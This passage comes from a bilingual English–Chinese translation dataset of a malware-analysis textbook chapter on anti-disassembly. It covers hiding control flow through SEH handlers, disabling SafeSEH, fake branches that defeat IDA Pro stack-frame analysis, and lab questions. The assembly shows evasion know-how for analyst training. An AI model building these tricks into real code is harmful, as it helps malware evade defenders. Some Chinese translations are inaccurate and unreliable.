  type: TYPE_NORMAL
  zh: 为了使用SEH来实现隐蔽的流程控制，我们不需要关心链中当前有多少异常记录。我们只需要了解如何将我们自己的处理程序添加到这个列表的顶部，如图15-6所示。
- en: '**344**'
  id: totrans-570
  prefs: []
  type: TYPE_NORMAL
  zh: '**344**'
- en: Chapter 15
  id: totrans-571
  prefs: []
  type: TYPE_NORMAL
  zh: 第15章
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-572
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: FS:[0]
  id: totrans-573
  prefs: []
  type: TYPE_NORMAL
  zh: FS:[0]
- en: prev handler
  id: totrans-574
  prefs: []
  type: TYPE_NORMAL
  zh: prev handler
- en: Handler Function
  id: totrans-575
  prefs: []
  type: TYPE_NORMAL
  zh: 处理函数
- en: prev handler
  id: totrans-576
  prefs: []
  type: TYPE_NORMAL
  zh: prev handler
- en: Handler Function
  id: totrans-577
  prefs: []
  type: TYPE_NORMAL
  zh: 处理函数
- en: prev handler
  id: totrans-578
  prefs: []
  type: TYPE_NORMAL
  zh: prev handler
- en: Handler Function
  id: totrans-579
  prefs: []
  type: TYPE_NORMAL
  zh: 处理函数
- en: prev handler
  id: totrans-580
  prefs: []
  type: TYPE_NORMAL
  zh: prev handler
- en: Handler Function
  id: totrans-581
  prefs: []
  type: TYPE_NORMAL
  zh: 处理函数
- en: '*Figure 15-6: Structured Exception Handling (SEH) chain* To add a record to
    this list, we need to construct a new record on the stack. Since the record structure
    is simply two DWORDs, we can do this with two push instructions. The stack grows
    upward, so the first push will be the pointer to the handler function, and the
    second push will be the pointer to the next record. We are trying to add a record
    to the top of the chain, so the next record in the chain when we finish will be
    what is currently the top, which is pointed to by fs:[0]. The following code performs
    this sequence.'
  id: totrans-582
  prefs: []
  type: TYPE_NORMAL
  zh: '*图15-6：结构化异常处理（SEH）链* 要将记录添加到这个列表中，我们需要在栈上构造一个新的记录。由于记录结构只是两个DWORD，我们可以用两个push指令来完成。栈向上增长，所以第一个push将是处理函数的指针，第二个push将是下一个记录的指针。我们试图将记录添加到链的顶部，所以当我们完成时，链中的下一个记录将是当前顶部，即由fs:[0]指向的。下面的代码执行了这个序列。'
- en: push ExceptionHandler
  id: totrans-583
  prefs: []
  type: TYPE_NORMAL
  zh: push ExceptionHandler
- en: push fs:[0]
  id: totrans-584
  prefs: []
  type: TYPE_NORMAL
  zh: push fs:[0]
- en: mov fs:[0], esp
  id: totrans-585
  prefs: []
  type: TYPE_NORMAL
  zh: mov fs:[0], esp
- en: The ExceptionHandler function will be called first whenever an exception occurs.
    This action will be subject to the constraints imposed by Microsoft’s Software
    Data Execution Prevention (Software DEP, also known as SafeSEH).
  id: totrans-586
  prefs: []
  type: TYPE_NORMAL
  zh: 异常处理程序函数将在发生异常时首先被调用。这一行为将受到Microsoft的软件数据执行保护（Software DEP，也称为SafeSEH）施加的限制。
- en: Software DEP is a security feature that prevents the addition of third-party
    exception handlers at runtime. For purposes of handwritten assembly code, there
    are several ways to work around this technology, such as using an assembler that
    has support for SafeSEH directives. Using Microsoft’s C compilers, an author can
    add /SAFESEH:NO to the linker command line to disable this.
  id: totrans-587
  prefs: []
  type: TYPE_NORMAL
  zh: 软件DEP是一种安全特性，它防止在运行时添加第三方异常处理程序。对于手写汇编代码，有几种方法可以绕过这项技术，例如使用支持SafeSEH指令的汇编器。使用Microsoft的C编译器，作者可以在链接器命令行中添加/SAFESEH:NO来禁用此功能。
- en: When the ExceptionHandler code is called, the stack will be drastically altered.
    Luckily, it is not essential for our purposes to fully examine all the data that
    is added to the stack at this point. We must simply understand how to return the
    stack to its original position prior to the exception. Remember that our goal
    is to obscure flow control and not to properly handle program exceptions.
  id: totrans-588
  prefs: []
  type: TYPE_NORMAL
  zh: 当ExceptionHandler代码被调用时，堆栈将发生剧烈变化。幸运的是，对于我们的目的来说，没有必要完全检查此时添加到堆栈的所有数据。我们只需了解如何将堆栈恢复到异常之前的原始位置。记住，我们的目标是隐藏流程控制，而不是正确处理程序异常。
- en: The OS adds another SEH handler when our handler is called. To return the program
    to normal operation, we need to unlink not just our handler, but this handler
    as well. Therefore, we need to pull our original stack pointer from esp+8 instead
    of esp.
  id: totrans-589
  prefs: []
  type: TYPE_NORMAL
  zh: 当我们的处理程序被调用时，操作系统会添加另一个SEH处理程序。为了使程序恢复正常操作，我们需要解除不仅我们的处理程序，还要解除这个处理程序的链接。因此，我们需要从esp+8而不是esp中拉取我们的原始堆栈指针。
- en: mov esp, [esp+8]
  id: totrans-590
  prefs: []
  type: TYPE_NORMAL
  zh: mov esp, [esp+8]
- en: mov eax, fs:[0]
  id: totrans-591
  prefs: []
  type: TYPE_NORMAL
  zh: mov eax, fs:[0]
- en: mov eax, [eax]
  id: totrans-592
  prefs: []
  type: TYPE_NORMAL
  zh: mov eax, [eax]
- en: mov eax, [eax]
  id: totrans-593
  prefs: []
  type: TYPE_NORMAL
  zh: mov eax, [eax]
- en: mov fs:[0], eax
  id: totrans-594
  prefs: []
  type: TYPE_NORMAL
  zh: mov fs:[0], eax
- en: add esp, 8
  id: totrans-595
  prefs: []
  type: TYPE_NORMAL
  zh: add esp, 8
- en: Anti-Disassembly
  id: totrans-596
  prefs: []
  type: TYPE_NORMAL
  zh: 反汇编
- en: '**345**'
  id: totrans-597
  prefs: []
  type: TYPE_NORMAL
  zh: '**345**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-598
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: Let’s bring all this knowledge back to our original goal of obscuring flow control.
    The following fragment contains a piece of code from a Visual C++
  id: totrans-599
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们把这些知识都带回我们最初的目的是隐藏流程控制的目标。以下片段包含来自Visual C++的反汇编代码。
- en: binary that covertly transfers flow to a subroutine. Since there is no pointer
    to this function and the disassembler doesn’t understand SEH, it appears as though
    the subroutine has no references, and the disassembler thinks the code immediately
    following the triggering of the exception will be executed.
  id: totrans-600
  prefs: []
  type: TYPE_NORMAL
  zh: 隐秘地将流程转移到子程序的二进制代码。由于没有指向此函数的指针，反汇编器也不理解SEH，因此看起来子程序没有引用，反汇编器认为在异常触发后立即执行的代码将被执行。
- en: 00401050 mov eax, (offset loc_40106B+1) 00401055 add eax, 14h
  id: totrans-601
  prefs: []
  type: TYPE_NORMAL
  zh: 00401050 mov eax, (offset loc_40106B+1) 00401055 add eax, 14h
- en: 00401058 push eax
  id: totrans-602
  prefs: []
  type: TYPE_NORMAL
  zh: 00401058 push eax
- en: 00401059 push large dword ptr fs:0 ; dwMilliseconds 00401060 mov large fs:0,
    esp
  id: totrans-603
  prefs: []
  type: TYPE_NORMAL
  zh: 00401059 push large dword ptr fs:0 ; dwMilliseconds 00401060 mov large fs:0,
    esp
- en: 00401067 xor ecx, ecx
  id: totrans-604
  prefs: []
  type: TYPE_NORMAL
  zh: 00401067 xor ecx, ecx
- en: 00401069 div ecx
  id: totrans-605
  prefs: []
  type: TYPE_NORMAL
  zh: 00401069 div ecx
- en: 0040106B
  id: totrans-606
  prefs: []
  type: TYPE_NORMAL
  zh: 0040106B
- en: '0040106B loc_40106B: ; DATA XREF: sub_401050o 0040106B call near ptr Sleep'
  id: totrans-607
  prefs: []
  type: TYPE_NORMAL
  zh: '0040106B loc_40106B: ; DATA XREF: sub_401050o 0040106B call near ptr Sleep'
- en: 00401070 retn
  id: totrans-608
  prefs: []
  type: TYPE_NORMAL
  zh: 00401070 retn
- en: 00401070 sub_401050 endp ; sp-analysis failed
  id: totrans-609
  prefs: []
  type: TYPE_NORMAL
  zh: 00401070 sub_401050 endp ; sp-analysis failed
- en: '00401070'
  id: totrans-610
  prefs: []
  type: TYPE_NORMAL
  zh: '00401070'
- en: 00401070 ; ------------------------------------------------------------------
  id: totrans-611
  prefs: []
  type: TYPE_NORMAL
  zh: 00401070 ; ------------------------------------------------------------------
- en: 00401071 align 10h
  id: totrans-612
  prefs: []
  type: TYPE_NORMAL
  zh: 00401071 align 10h
- en: 00401080 dd 824648Bh, 0A164h, 8B0000h, 0A364008Bh, 0
  id: totrans-613
  prefs: []
  type: TYPE_NORMAL
  zh: 00401080 dd 824648Bh, 0A164h, 8B0000h, 0A364008Bh, 0
- en: 00401094 dd 6808C483h
  id: totrans-614
  prefs: []
  type: TYPE_NORMAL
  zh: 00401094 dd 6808C483h
- en: 00401098 dd offset aMysteryCode ; "Mystery Code"
  id: totrans-615
  prefs: []
  type: TYPE_NORMAL
  zh: 00401098 dd offset aMysteryCode ; "Mystery Code"
- en: 0040109C dd 2DE8h, 4C48300h, 3 dup(0CCCCCCCCh) In this example, IDA Pro has
    not only missed the fact that the subroutine at location 401080  was not called,
    but it also failed to even disassemble this function. This code sets up an exception
    handler covertly by first setting the register EAX to the value 40106C , and
    then adding 14h to it to build a pointer to the function 401080\. A divide-by-zero
    exception is triggered by setting ECX to zero with xor ecx, ecx followed by div
    ecx at , which divides the EAX register by ECX.
  id: totrans-616
  prefs: []
  type: TYPE_NORMAL
  zh: 0040109C dd 2DE8h, 4C48300h, 3 dup(0CCCCCCCCh) 在此示例中，IDA Pro不仅遗漏了位于401080处的子程序未被调用的事实，而且还未能对这一函数进行反汇编。此代码通过首先将寄存器EAX设置为40106C的值，然后加14h来构建指向函数401080的指针，秘密地设置了一个异常处理程序。通过将ECX设置为0（使用xor
    ecx, ecx）并在处执行div ecx来触发除以零异常，这会将EAX寄存器除以ECX。
- en: Let’s use the C key in IDA Pro to turn the data at location 401080 into code
    and see what was hidden using this trick.
  id: totrans-617
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们使用 IDA Pro 中的 C 键将位于 401080 的数据转换为代码，并查看使用此技巧隐藏了什么。
- en: 00401080 mov esp, [esp+8]
  id: totrans-618
  prefs: []
  type: TYPE_NORMAL
  zh: 00401080 mov esp, [esp+8]
- en: 00401084 mov eax, large fs:0
  id: totrans-619
  prefs: []
  type: TYPE_NORMAL
  zh: 00401084 mov eax, large fs:0
- en: 0040108A mov eax, [eax]
  id: totrans-620
  prefs: []
  type: TYPE_NORMAL
  zh: 0040108A mov eax, [eax]
- en: 0040108C mov eax, [eax]
  id: totrans-621
  prefs: []
  type: TYPE_NORMAL
  zh: 0040108C mov eax, [eax]
- en: 0040108E mov large fs:0, eax
  id: totrans-622
  prefs: []
  type: TYPE_NORMAL
  zh: 0040108E mov large fs:0, eax
- en: 00401094 add esp, 8
  id: totrans-623
  prefs: []
  type: TYPE_NORMAL
  zh: 00401094 add esp, 8
- en: 00401097 push offset aMysteryCode ; "Mystery Code"
  id: totrans-624
  prefs: []
  type: TYPE_NORMAL
  zh: 00401097 push offset aMysteryCode ; "Mystery Code"
- en: 0040109C call printf
  id: totrans-625
  prefs: []
  type: TYPE_NORMAL
  zh: 0040109C call printf
- en: '**346**'
  id: totrans-626
  prefs: []
  type: TYPE_NORMAL
  zh: '**346**'
- en: Chapter 15
  id: totrans-627
  prefs: []
  type: TYPE_NORMAL
  zh: 第 15 章
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-628
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '**Thwarting Stack-Frame Analysis**'
  id: totrans-629
  prefs: []
  type: TYPE_NORMAL
  zh: '**阻止栈帧分析**'
- en: Advanced disassemblers can analyze the instructions in a function to deduce
    the construction of its stack frame, which allows them to display the local variables
    and parameters relevant to the function. This information is extremely valuable
    to a malware analyst, as it allows for the analysis of a single function at one
    time, and enables the analyst to better understand its inputs, outputs, and construction.
  id: totrans-630
  prefs: []
  type: TYPE_NORMAL
  zh: 高级反汇编器可以分析函数中的指令以推断其栈帧结构，这使得它们能够显示与函数相关的局部变量和参数。这些信息对于恶意软件分析员来说极其宝贵，因为它允许一次分析一个函数，并使分析员能够更好地理解其输入、输出和结构。
- en: However, analyzing a function to determine the construction of its stack frame
    is not an exact science. As with many other facets of disassembly, the algorithms
    used to determine the construction of the stack frame must make certain assumptions
    and guesses that are reasonable but can usually be exploited by a knowledgeable
    malware author.
  id: totrans-631
  prefs: []
  type: TYPE_NORMAL
  zh: 然而，分析一个函数以确定其栈帧结构并不是一门精确的科学。与其他许多反汇编方面一样，用于确定栈帧结构的算法必须做出某些合理的假设和猜测，但这些通常可以被知识渊博的恶意软件作者利用。
- en: Defeating stack-frame analysis will also prevent the operation of certain analytical
    techniques, most notably the Hex-Rays Decompiler plug-in for IDA Pro, which produces
    C-like pseudocode for a function.
  id: totrans-632
  prefs: []
  type: TYPE_NORMAL
  zh: 阻止栈帧分析也将防止某些分析技术的操作，最值得注意的是 IDA Pro 的 Hex-Rays 反汇编插件，它为函数生成类似 C 的伪代码。
- en: Let’s begin by examining a function that has been armored to defeat stack-frame
    analysis.
  id: totrans-633
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们从检查一个被武装以抵抗栈帧分析的功能开始。
- en: '00401543 sub_401543 proc near ; CODE XREF: sub_4012D0+3Cp 00401543 ; sub_401328+9Bp
    00401543'
  id: totrans-634
  prefs: []
  type: TYPE_NORMAL
  zh: '00401543 sub_401543 proc near ; CODE XREF: sub_4012D0+3Cp 00401543 ; sub_401328+9Bp
    00401543'
- en: 00401543 arg_F4 = dword ptr 0F8h
  id: totrans-635
  prefs: []
  type: TYPE_NORMAL
  zh: 00401543 arg_F4 = dword ptr 0F8h
- en: 00401543 arg_F8 = dword ptr 0FCh
  id: totrans-636
  prefs: []
  type: TYPE_NORMAL
  zh: 00401543 arg_F8 = dword ptr 0FCh
- en: '00401543'
  id: totrans-637
  prefs: []
  type: TYPE_NORMAL
  zh: '00401543'
- en: 00401543 000 sub esp, 8
  id: totrans-638
  prefs: []
  type: TYPE_NORMAL
  zh: 00401543 000 sub esp, 8
- en: 00401546 008 sub esp, 4
  id: totrans-639
  prefs: []
  type: TYPE_NORMAL
  zh: 00401546 008 sub esp, 4
- en: 00401549 00C cmp esp, 1000h
  id: totrans-640
  prefs: []
  type: TYPE_NORMAL
  zh: 00401549 00C cmp esp, 1000h
- en: 0040154F 00C jl short loc_401556
  id: totrans-641
  prefs: []
  type: TYPE_NORMAL
  zh: 0040154F 00C jl short loc_401556
- en: 00401551 00C add esp, 4
  id: totrans-642
  prefs: []
  type: TYPE_NORMAL
  zh: 00401551 00C add esp, 4
- en: 00401554 008 jmp short loc_40155C
  id: totrans-643
  prefs: []
  type: TYPE_NORMAL
  zh: 00401554 008 jmp short loc_40155C
- en: 00401556 ; --------------------------------------------------------------
  id: totrans-644
  prefs: []
  type: TYPE_NORMAL
  zh: 00401556 ; --------------------------------------------------------------
- en: '00401556'
  id: totrans-645
  prefs: []
  type: TYPE_NORMAL
  zh: '00401556'
- en: '00401556 loc_401556: ; CODE XREF: sub_401543+Cj 00401556 00C add esp, 104h'
  id: totrans-646
  prefs: []
  type: TYPE_NORMAL
  zh: '00401556 loc_401556: ; CODE XREF: sub_401543+Cj 00401556 00C add esp, 104h'
- en: 0040155C
  id: totrans-647
  prefs: []
  type: TYPE_NORMAL
  zh: 0040155C
- en: '0040155C loc_40155C: ; CODE XREF: sub_401543+11j 0040155C -F8'
  id: totrans-648
  prefs: []
  type: TYPE_NORMAL
  zh: '0040155C loc_40155C: ; CODE XREF: sub_401543+11j 0040155C -F8'
- en: mov [esp-0F8h+arg_F8], 1E61h
  id: totrans-649
  prefs: []
  type: TYPE_NORMAL
  zh: mov [esp-0F8h+arg_F8], 1E61h
- en: 00401564 -F8 lea eax, [esp-0F8h+arg_F8]
  id: totrans-650
  prefs: []
  type: TYPE_NORMAL
  zh: 00401564 -F8 lea eax, [esp-0F8h+arg_F8]
- en: 00401568 -F8 mov [esp-0F8h+arg_F4], eax 0040156B -F8 mov edx, [esp-0F8h+arg_F4]
  id: totrans-651
  prefs: []
  type: TYPE_NORMAL
  zh: 00401568 -F8 mov [esp-0F8h+arg_F4], eax 0040156B -F8 mov edx, [esp-0F8h+arg_F4]
- en: 0040156E -F8 mov eax, [esp-0F8h+arg_F8]
  id: totrans-652
  prefs: []
  type: TYPE_NORMAL
  zh: 0040156E -F8 mov eax, [esp-0F8h+arg_F8]
- en: 00401572 -F8 inc eax
  id: totrans-653
  prefs: []
  type: TYPE_NORMAL
  zh: 00401572 -F8 inc eax
- en: 00401573 -F8 mov [edx], eax
  id: totrans-654
  prefs: []
  type: TYPE_NORMAL
  zh: 00401573 -F8 mov [edx], eax
- en: 00401575 -F8 mov eax, [esp-0F8h+arg_F4]
  id: totrans-655
  prefs: []
  type: TYPE_NORMAL
  zh: 00401575 -F8 mov eax, [esp-0F8h+arg_F4]
- en: 00401578 -F8 mov eax, [eax]
  id: totrans-656
  prefs: []
  type: TYPE_NORMAL
  zh: 00401578 -F8 mov eax, [eax]
- en: 0040157A -F8 add esp, 8
  id: totrans-657
  prefs: []
  type: TYPE_NORMAL
  zh: 0040157A -F8 add esp, 8
- en: 0040157D -100 retn
  id: totrans-658
  prefs: []
  type: TYPE_NORMAL
  zh: 0040157D -100 retn
- en: 0040157D sub_401543 endp ; sp-analysis failed
  id: totrans-659
  prefs: []
  type: TYPE_NORMAL
  zh: 0040157D sub_401543 endp ; sp-analysis failed
- en: '*Listing 15-1: A function that defeats stack-frame analysis* Anti-Disassembly'
  id: totrans-660
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 15-1：一个用于抵抗栈帧分析的函数* 反汇编'
- en: '**347**'
  id: totrans-661
  prefs: []
  type: TYPE_NORMAL
  zh: '**347**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-662
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: Stack-frame anti-analysis techniques depend heavily on the compiler used. Of
    course, if the malware is entirely written in assembly, then the author is free
    to use more unorthodox techniques. However, if the malware is crafted with a higher-level
    language such as C or C++, special care must be taken to output code that can
    be manipulated.
  id: totrans-663
  prefs: []
  type: TYPE_NORMAL
  zh: 栈帧反分析技术高度依赖于所使用的编译器。当然，如果恶意软件完全用汇编语言编写，则作者可以自由地使用更多非常规技术。然而，如果恶意软件是用 C 或 C++
    等高级语言编写的，则必须特别小心地输出可操作代码。
- en: In Listing 15-1, the column on the far left is the standard IDA Pro line prefix,
    which contains the segment name and memory address for each function. The next
    column to the right displays the stack pointer. For each instruction, the stack
    pointer column shows the value of the ESP register relative to where it was at
    the beginning of the function. This view shows that this function is an ESP-based
    stack frame rather than an EBP-based one, like most functions. (This stack pointer
    column can be enabled in IDA Pro through the Options menu.)
  id: totrans-664
  prefs: []
  type: TYPE_NORMAL
  zh: 在列表 15-1 中，最左侧的列是标准的 IDA Pro 行前缀，其中包含每个函数的段名和内存地址。右侧的下一列显示堆栈指针。对于每条指令，堆栈指针列显示
    ESP 寄存器相对于函数开始时的值。这个视图显示这个函数是基于 ESP 的堆栈帧，而不是像大多数函数那样的基于 EBP 的堆栈帧。（这个堆栈指针列可以在 IDA
    Pro 的选项菜单中启用。）
- en: At , the stack pointer begins to be shown as a negative number. This should
    never happen for an ordinary function because it means that this function could
    damage the calling function’s stack frame. In this listing, IDA Pro is also telling
    us that it thinks this function takes 62 arguments, of which it thinks 2 are actually
    being used.
  id: totrans-665
  prefs: []
  type: TYPE_NORMAL
  zh: 在 ，堆栈指针开始显示为负数。这对于普通函数来说永远不会发生，因为这意味着这个函数可能会损坏调用函数的堆栈帧。在这个列表中，IDA Pro 也告诉我们，它认为这个函数接受
    62 个参数，其中它认为有 2 个实际上正在使用。
- en: '**NOTE**'
  id: totrans-666
  prefs: []
  type: TYPE_NORMAL
  zh: '**注意**'
- en: '*Press CTRL-K in IDA Pro to examine this monstrous stack frame in detail. If
    you* *attempt to press Y to give this function a prototype, you’ll be presented
    with one of* *the most ghastly abominations of a function prototype you’ve ever
    seen.*'
  id: totrans-667
  prefs: []
  type: TYPE_NORMAL
  zh: '*在 IDA Pro 中按 CTRL-K 键可以详细检查这个巨大的堆栈帧。如果你* *尝试按 Y 键为这个函数提供一个原型，你会看到你* *见过的最令人毛骨悚然的函数原型之一。*'
- en: As you may have guessed, this function doesn’t actually take 62 arguments. In
    reality, it takes no arguments and has two local variables. The code responsible
    for breaking IDA Pro’s analysis lies near the beginning of the function, between
    locations 00401546 and 0040155C. It’s a simple comparison with two branches.
  id: totrans-668
  prefs: []
  type: TYPE_NORMAL
  zh: 如你所猜，这个函数实际上并没有接受 62 个参数。实际上，它不接受任何参数，并且有两个局部变量。负责破坏 IDA Pro 分析的代码位于函数的开始附近，在
    00401546 和 0040155C 之间。这是一个简单的比较，有两个分支。
- en: The ESP register is being compared against the value 0x1000\. If it is less
    than 0x1000, then it executes the code at 00401556; otherwise, it executes the
    code at 00401551\. Each branch adds some value to ESP—0x104 on the “less-than”
    branch and 4 on the “greater-than-or-equal-to” branch. From a disassembler’s perspective,
    there are two possible values of the stack pointer offset at this point, depending
    on which branch has been taken. The disassembler is forced to make a choice, and
    luckily for the malware author, it is tricked into making the wrong choice.
  id: totrans-669
  prefs: []
  type: TYPE_NORMAL
  zh: ESP 寄存器正在与值 0x1000 进行比较。如果它小于 0x1000，则执行 00401556 处的代码；否则，执行 00401551 处的代码。每个分支都会向
    ESP 添加一些值——在“小于”分支上是 0x104，在“大于或等于”分支上是 4。从反汇编器的角度来看，此时堆栈指针偏移量有两个可能的值，这取决于哪个分支被执行。反汇编器被迫做出选择，幸运的是，它被诱骗做出了错误的选择。
- en: Earlier, we discussed conditional branch instructions, which were not conditional
    at all because they exist where the condition is constant, such as a jz instruction
    immediately following an xor eax, eax instruction. Innovative disassembler authors
    could code special semantics in their algorithm to track such guaranteed flag
    states and detect the presence of such fake conditional branches. The code would
    be useful in many scenarios and would be very straightforward, though cumbersome,
    to implement.
  id: totrans-670
  prefs: []
  type: TYPE_NORMAL
  zh: 之前，我们讨论了条件分支指令，这些指令根本不是条件性的，因为它们存在于条件是常数的地方，例如紧跟在 xor eax, eax 指令之后的 jz 指令。创新的反汇编器作者可以在他们的算法中编码特殊的语义来跟踪这样的保证标志状态并检测这种虚假条件分支的存在。这种代码在许多场景中都是有用的，尽管实现起来很繁琐，但非常直接。
- en: In Listing 15-1, the instruction cmp esp, 1000h will always produce a fixed
    result. An experienced malware analyst might recognize that the lowest memory
    page in a Windows process would not be used as a stack, and thus this comparison
    is virtually guaranteed to always result in the “greater-than-348
  id: totrans-671
  prefs: []
  type: TYPE_NORMAL
  zh: 在列表 15-1 中，指令 cmp esp, 1000h 将始终产生一个固定结果。一个经验丰富的恶意软件分析师可能会意识到，Windows 进程中最低的内存页面不会被用作堆栈，因此这个比较几乎可以保证总是导致“大于
    348
- en: Chapter 15
  id: totrans-672
  prefs: []
  type: TYPE_NORMAL
  zh: 第 15 章
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-673
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: or-equal-to” branch being executed. The disassembly program doesn’t have this
    level of intuition. Its job is to show you the instructions. It’s not designed
    to evaluate every decision in the code against a set of real-world scenarios.
  id: totrans-674
  prefs: []
  type: TYPE_NORMAL
  zh: 或等于分支正在执行。反汇编程序没有这种程度的直觉。它的任务是向您展示指令。它不是设计来评估代码中的每个决策与一组现实世界场景的。
- en: The crux of the problem is that the disassembler assumed that the add esp, 104h
    instruction was valid and relevant, and adjusted its interpretation of the stack
    accordingly. The add esp, 4 instruction in the greater-than-or-equal-to branch
    was there solely to readjust the stack after the sub esp, 4 instruction that came
    before the comparison. The net result in real time is that the ESP
  id: totrans-675
  prefs: []
  type: TYPE_NORMAL
  zh: 问题的核心在于反汇编器假设`add esp, 104h`指令是有效且相关的，并据此相应地调整了对栈的解释。在大于或等于分支中的`add esp, 4`指令仅仅是为了在比较之前的`sub
    esp, 4`指令之后重新调整栈。在实时中的净结果是ESP的值将与地址00401546处序列开始之前的值相同。
- en: value will be identical to what it was prior to the beginning of the sequence
    at address 00401546\.
  id: totrans-676
  prefs: []
  type: TYPE_NORMAL
  zh: 的值将与地址00401546处序列开始之前的值相同。
- en: To overcome minor adjustments to the stack frame (which occur occasionally due
    to the inherently fallible nature of stack-frame analysis), in IDA Pro, you can
    put the cursor on a particular line of disassembly and press ALT-K to enter an
    adjustment to the stack pointer. In many cases, such as in Listing 15-1, it may
    prove more fruitful to patch the stack-frame manipulation instructions, as in
    the previous examples.
  id: totrans-677
  prefs: []
  type: TYPE_NORMAL
  zh: 为了克服对栈帧的微小调整（由于栈帧分析固有的易错性而偶尔发生），在IDA Pro中，您可以将光标放在反汇编的特定行上，然后按ALT-K键进入对栈指针的调整。在许多情况下，例如在列表15-1中，修补栈帧操作指令可能更有成效，就像之前的例子一样。
- en: '**Conclusion**'
  id: totrans-678
  prefs: []
  type: TYPE_NORMAL
  zh: '**结论**'
- en: Anti-disassembly is not confined to the techniques discussed in this chapter.
  id: totrans-679
  prefs: []
  type: TYPE_NORMAL
  zh: 反汇编防御不仅限于本章讨论的技术。
- en: It is a class of techniques that takes advantage of the inherent difficulties
    in analysis. Advanced programs such as modern disassemblers do an excellent job
    of determining which instructions constitute a program, but they still require
    assumptions and choices to be made in the process. For each choice or assumption
    that can be made by a disassembler, there may be a corresponding anti-disassembly
    technique.
  id: totrans-680
  prefs: []
  type: TYPE_NORMAL
  zh: 这是一类利用分析固有困难的技术。现代反汇编器等高级程序在确定哪些指令构成程序方面做得非常出色，但它们在过程中仍然需要做出假设和选择。对于反汇编器可以做出的每个选择或假设，可能都有一个相应的反汇编防御技术。
- en: This chapter showed how disassemblers work and how linear and flow-oriented
    disassembly strategies differ. Anti-disassembly is more difficult with a flow-oriented
    disassembler but still quite possible, once you understand that the disassembler
    is making certain assumptions about where the code will execute. Many anti-disassembly
    techniques used against flow-oriented disassemblers operate by crafting conditional
    flow-control instructions for which the condition is always the same at runtime
    but unknown by the disassembler.
  id: totrans-681
  prefs: []
  type: TYPE_NORMAL
  zh: 本章展示了反汇编器的工作原理以及线性与面向流程的反汇编策略如何不同。面向流程的反汇编器进行反汇编防御更困难，但一旦理解到反汇编器对代码将执行的位置做出了一定的假设，仍然是非常可能的。许多针对面向流程的反汇编器使用的反汇编防御技术是通过构建条件流程控制指令来操作的，这些指令在运行时条件始终相同，但反汇编器却不知道。
- en: Obscuring flow control is a way that malware can cause the malware analyst to
    overlook portions of code or hide a function’s purpose by obscuring its relation
    to other functions and system calls. We examined several ways to accomplish this,
    ranging from using the ret instruction to using SEH handlers as a general-purpose
    jump.
  id: totrans-682
  prefs: []
  type: TYPE_NORMAL
  zh: 模糊流程控制是恶意软件可以导致恶意软件分析师忽略代码部分或通过模糊其与其他函数和系统调用的关系来隐藏函数目的的一种方式。我们探讨了实现这一目标的各种方法，从使用`ret`指令到使用SEH处理程序作为通用跳转。
- en: The goal of this chapter was to help you understand code from a tactical perspective.
    You learned how these types of techniques work, why they are useful, and how to
    defeat them when you encounter them in the field. More techniques are waiting
    to be discovered and invented. With this solid foundation, you will be more than
    prepared to wage war in the anti-disassembly battlefield of the future.
  id: totrans-683
  prefs: []
  type: TYPE_NORMAL
  zh: 本章的目标是帮助您从战术角度理解代码。您学习了这些类型的技术是如何工作的，为什么它们是有用的，以及如何在遇到它们时如何击败它们。还有更多技术等待被发现和发明。有了这个坚实的基础，您将准备好在未来反汇编防御战场上进行战斗。
- en: Anti-Disassembly
  id: totrans-684
  prefs: []
  type: TYPE_NORMAL
  zh: 反汇编防御
- en: '**349**'
  id: totrans-685
  prefs: []
  type: TYPE_NORMAL
  zh: '**349**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-686
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '**L A B S**'
  id: totrans-687
  prefs: []
  type: TYPE_NORMAL
  zh: '**L A B S**'
- en: '**Lab 15-1**'
  id: totrans-688
  prefs: []
  type: TYPE_NORMAL
  zh: '**Lab 15-1**'
- en: Analyze the sample found in the file *Lab15-01.exe*. This is a command-line
    program that takes an argument and prints “Good Job!” if the argument matches
    a secret code.
  id: totrans-689
  prefs: []
  type: TYPE_NORMAL
  zh: 分析文件 *Lab15-01.exe* 中的样本。这是一个命令行程序，它接受一个参数，如果参数匹配一个秘密代码，则打印“做得好！”。
- en: '***Questions***'
  id: totrans-690
  prefs: []
  type: TYPE_NORMAL
  zh: '***问题***'
- en: 1\.
  id: totrans-691
  prefs: []
  type: TYPE_NORMAL
  zh: '1.'
- en: What anti-disassembly technique is used in this binary?
  id: totrans-692
  prefs: []
  type: TYPE_NORMAL
  zh: 在这个二进制文件中使用了哪种反汇编技术？
- en: 2\.
  id: totrans-693
  prefs: []
  type: TYPE_NORMAL
  zh: '2.'
- en: What rogue opcode is the disassembly tricked into disassembling?
  id: totrans-694
  prefs: []
  type: TYPE_NORMAL
  zh: 反汇编技巧将哪个恶意操作码欺骗性地反汇编？
- en: 3\.
  id: totrans-695
  prefs: []
  type: TYPE_NORMAL
  zh: '3.'
- en: How many times is this technique used?
  id: totrans-696
  prefs: []
  type: TYPE_NORMAL
  zh: 这种技术使用了多少次？
- en: 4\.
  id: totrans-697
  prefs: []
  type: TYPE_NORMAL
  zh: '4.'
- en: What command-line argument will cause the program to print
  id: totrans-698
  prefs: []
  type: TYPE_NORMAL
  zh: 什么命令行参数会导致程序打印
- en: “Good Job!”?
  id: totrans-699
  prefs: []
  type: TYPE_NORMAL
  zh: “做得好！”？
- en: '**Lab 15-2**'
  id: totrans-700
  prefs: []
  type: TYPE_NORMAL
  zh: '**Lab 15-2**'
